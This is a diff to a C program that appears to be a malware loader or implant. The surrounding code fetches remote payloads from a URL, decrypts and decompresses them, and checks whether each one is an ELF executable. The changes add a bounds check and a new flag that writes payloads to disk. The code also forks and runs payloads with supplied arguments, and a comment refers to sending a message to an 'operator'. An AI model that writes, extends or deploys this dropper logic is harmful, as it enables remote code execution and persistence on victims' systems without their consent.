@@ -82,6 +82,14 @@ int main()
         decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
         
         numLines = countLines(decompressed);
+        if (numLines <= currLineNum)
+        {
+            free(decompressed);
+            free(payload.memory);
+            free(formattedURL);
+            freePayloadMeta(payloadMeta);
+            continue;
+        }
         currLines = parsePayloads(decompressed, numLines, ";");
         currLine = currLines[currLineNum];
 
@@ -189,38 +197,47 @@ int main()
                     return -1;
                 }
                 
-                d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF
+                if (payloadMeta[i].flags & 0x4){
+                    sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
+                    writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
+                    numFiles++;
+                }
 
-                if (d == 1)
+                else
                 {
-                    if ((child = fork()) == 0)
+                    d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF
+
+                    if (d == 1)
                     {
-                        if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
+                        if ((child = fork()) == 0)
                         {
-                            //send message to operator
-                            freePayloads(currLines, numLines);
-                            freePayloads(payloadNames, numPayloads);
-                            freePayloadMeta(payloadMeta);
-                            free(payload.memory);
-                            free(formattedURL);
-                            free(psswd);
-                            free(decompressed);
-                            free(uid);
-                            return -1;
+                            if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
+                            {
+                                //send message to operator
+                                freePayloads(currLines, numLines);
+                                freePayloads(payloadNames, numPayloads);
+                                freePayloadMeta(payloadMeta);
+                                free(payload.memory);
+                                free(formattedURL);
+                                free(psswd);
+                                free(decompressed);
+                                free(uid);
+                                return -1;
+                            }
+                        }
+                        else
+                        {
+                            if (payloadMeta[i].flags & 0x1)
+                                wait(&child); // wait for child to finish within parent
                         }
                     }
                     else
                     {
-                        if (payloadMeta[i].flags & 0x1)
-                            wait(&child); // wait for child to finish within parent
-                    }
-                }
-                else
-                {
-                    if (payloadMeta[i].flags & 0x2){
-                        sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
-                        writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
-                        numFiles++;
+                        if (payloadMeta[i].flags & 0x2){
+                            sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
+                            writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
+                            numFiles++;
+                        }
                     }
                 }
                 free(decompressed);
